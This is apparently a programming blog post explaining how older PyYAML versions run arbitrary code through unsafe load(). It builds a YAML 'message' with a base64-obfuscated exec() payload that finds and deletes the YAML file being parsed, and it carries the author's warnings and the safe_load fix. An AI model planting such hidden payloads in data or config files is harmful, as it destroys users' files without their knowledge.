---
layout: post
title: This YAML file will self-destruct in five seconds!
category: Programming and code
---

If you know the *Mission: Impossible* films (or before that, the 1966 TV series), you've surely heard the famous phrase, "This tape will self-destruct in five seconds. Good luck, Jim."
As soon as our hero hears his instructions, the tape emits a cloud of smoke and is rendered useless.

But would this work in 2019?
Could we equip a modern-day spy with a message that would self-destruct as soon as you read it?
The answer: yes, but you really shouldn't.

<img src="/images/2019/tape_recorder_1x.jpg" srcset="/images/2019/tape_recorder_1x.jpg 1x, /images/2019/tape_recorder.jpg 2x" alt="A tape recorder with smoke coming out of it.">

Let's start by talking about YAML, which is how we'll create this disappearing dispatch.
[YAML] is a language for serialising data.
You can use it to store data structures like lists, maps, and text -- similar to JSON or XML -- and it's often used for config files and the like.
Here's a small example:

```yaml
name: "lexie"
cat_count: 2

cats:
  - name: "Bailey"
    colour: "ochre"
  - name: "Bertie"
    colour: "black"
```

[YAML]: https://en.wikipedia.org/wiki/YAML

The basic YAML syntax allows you to specify simple data structures (lists, maps, and so on), but what if you want to serialise something more complicated?
You can use a *tag* in your YAML file to tell the parser that it should treat the data as a more complex object.

For example, the `!square` tag here could tell the parser that rather than treating this value as a string, it should create an instance of a special `Square` class:

```yaml
!square "0,0,10,10"
```

There are also language-specific tags, and this is where we start to run into trouble.
If you run this through a Python YAML parser, it creates a tuple instead of a list:

```yaml
!!python/tuple [triangle, square, circle]
```

To do this properly, your parser needs to be executing arbitrary code, and that's always a recipe for security vulnerabilities.
For a long time, the default `load()` function in the [PyYAML module][pyyaml] was unsafe, and would run any code in the YAML it received.
This meant you could call system functions with `os.system`:

```python
import yaml

yaml.load("!!python/object/new:os.system [echo BOOM!]")
```

There was a `safe_load()` function that would only load a subset of YAML that didn't feature arbitrary code execution, but it wasn't until earlier this year that safe loading [became the default][deprecation].

[pyyaml]: https://pypi.org/project/PyYAML/
[deprecation]: https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation

Ever since I learnt about this behaviour, I've idly wondered if you could use this to cause the YAML file to delete itself, and yesterday I got that working.
This is shocking, disgusting code, and you shouldn't use it in practice -- but it proves the idea.

Using `os.system` is powerful, but the builtin [`exec()` function][exec] is even more powerful.
If you pass this a string, it tries to execute the string as Python code.
Always be careful when using this function, and never pass it untrusted input -- or somebody could run arbitrary code on your machine.

We can use old versions of PyYAML to call `exec()` from a YAML file:

```yaml
!!python/object/new:exec [
  name = "Mr Phelps";

  print("Hello %s." % name)
]
```

If you call `yaml.load()` with a vulnerable version of PyYAML (< 5.1), it prints the text `Hello Mr Phelps.` -- but we could do anything we like here.

[exec]: https://docs.python.org/3/library/functions.html#exec

For example, we could look up the ID of the parent process (the Python interpreter that's doing the parsing), and then use [lsof on Linux][lsof] to see what files that process has open:

```yaml
!!python/object/new:exec [
  import os;

  parent_process_id = os.getppid();

  os.system("lsof -p %s" % parent_process_id);
]
```

[lsof]: https://linux.die.net/man/8/lsof

And if we can see what files a process has open… well, we could see what YAML file it's parsing, and delete them from underneath it.
I tried to write something like this:

```yaml
!!python/object/new:exec [
  import os;
  import subprocess;
  import sys;
  import time;

  parent_process_id = os.getppid();

  open_files = subprocess.check_output(
      ["lsof", "-p", str(parent_process_id)]
  ).decode("utf8");

  filenames = [
      line.split()[-1]
      for line in open_files.splitlines()
  ];

  yaml_files = [
      f
      for f in filenames
      if f.endswith((".yml", ".yaml"))
  ];

  for yf in yaml_files:
      print(
          "This file will self-destruct in five seconds. Good luck, Jim.",
          file=sys.stderr
      );
      time.sleep(5);
      os.unlink(yf)
]
```

but you get errors from the YAML parser -- the square brackets, quotes, and commas look like they might be part of the YAML syntax, and the parser gets confused.

I hit this issue a couple of times, and I tried to be clever and write my Python code to avoid any of those characters, but it severely limits the code you can write.
(Among other things, not having commas means you can't call functions with more than one argument.)

We can get round this by doubling down on our first bad idea.
If you want to get a string through an environment that only allows a limited set of characters, you can often use [base64 encoding][base64].
This encodes your text in a form that only uses alphanumeric characters A–Z, a–z, 0–9, plus three punctuation characters (`+`, `/`, and `=`).
If we encode our source code as base64, then get `exec()` to decode it and then call `exec()` a second time -- that would get past the YAML parser.

Once you have your base64-encoded source, here's what that would look like

```yaml
!!python/object/new:exec [
  import base64;

  encoded_source = b"...";
  source = base64.b64encode(encoded_source);

  exec(source)
]
```

[base64]: https://en.wikipedia.org/wiki/Base64

If we do this to the source code above, here's the message we end up with:

```yaml
from: "Lexie <lexie@alexwlchan.net>"
to: "Jim Phelps <jim.phelps@imf.org>"

message: "Beware Swiss villains bearing lasers!"

action:
  !!python/object/new:exec [
    import base64;

    encoded_source = (
        b"aW1wb3J0IG9zOwppbXBvcnQgc3VicHJvY2VzczsKaW1wb3J0IHN5czsKaW1wb3J0IHRp"
        b"bWU7CgpwYXJlbnRfcHJvY2Vzc19pZCA9IG9zLmdldHBwaWQoKTsKCm9wZW5fZmlsZXMg"
        b"PSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgKICAgIFsibHNvZiIsICItcCIsIHN0cihw"
        b"YXJlbnRfcHJvY2Vzc19pZCldCikuZGVjb2RlKCJ1dGY4Iik7CgpmaWxlbmFtZXMgPSBb"
        b"CiAgICBsaW5lLnNwbGl0KClbLTFdCiAgICBmb3IgbGluZSBpbiBvcGVuX2ZpbGVzLnNw"
        b"bGl0bGluZXMoKQpdOwoKeWFtbF9maWxlcyA9IFsKICAgIGYKICAgIGZvciBmIGluIGZp"
        b"bGVuYW1lcwogICAgaWYgZi5lbmRzd2l0aCgoIi55bWwiLCAiLnlhbWwiKSkKXTsKCmZv"
        b"ciB5ZiBpbiB5YW1sX2ZpbGVzOgogICAgcHJpbnQoCiAgICAgICAgIlRoaXMgZmlsZSB3"
        b"aWxsIHNlbGYtZGVzdHJ1Y3QgaW4gZml2ZSBzZWNvbmRzLiBHb29kIGx1Y2ssIEppbS4i"
        b"LAogICAgICAgIGZpbGU9c3lzLnN0ZGVycgogICAgKTsKICAgIHRpbWUuc2xlZXAoNSk7"
        b"CiAgICBvcy51bmxpbmsoeWYpOwogICAgcHJpbnQoIvCfkqUiKTs="
    );
    source = base64.b64decode(encoded_source);

    exec(source)
  ]
```

and if Jim Phelps parses this using his special IMF-approved message reader:

```python
import yaml  # PyYAML < 5.1

with open("message.yml") as f:
    message = yaml.load(f)
    print(message)
```

then the file will burst into (metaphorical) smoke before his eyes!

This code is dastardly, terrible, and you really shouldn't use it.
It abuses unsafe YAML loading and the `exec()` function, neither of which should ever be used with untrusted input.
It's also quite fragile; `lsof` behaves differently across platforms, and this likely won't work on macOS or Windows.

Please don't use this for anything serious.
If it explodes, I will disavow any knowledge of your code.
